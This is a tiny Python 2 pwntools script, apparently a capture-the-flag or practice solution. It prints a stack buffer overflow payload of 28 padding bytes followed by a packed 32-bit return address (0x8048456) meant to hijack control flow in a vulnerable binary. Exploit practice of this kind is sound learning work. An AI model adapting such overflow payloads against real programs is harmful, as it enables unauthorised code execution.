#!/usr/bin/env python2

from pwn import *
import sys

if sys.argv[1] == '32':
    sys.stdout.write('a'*28 + p32(0x8048456))
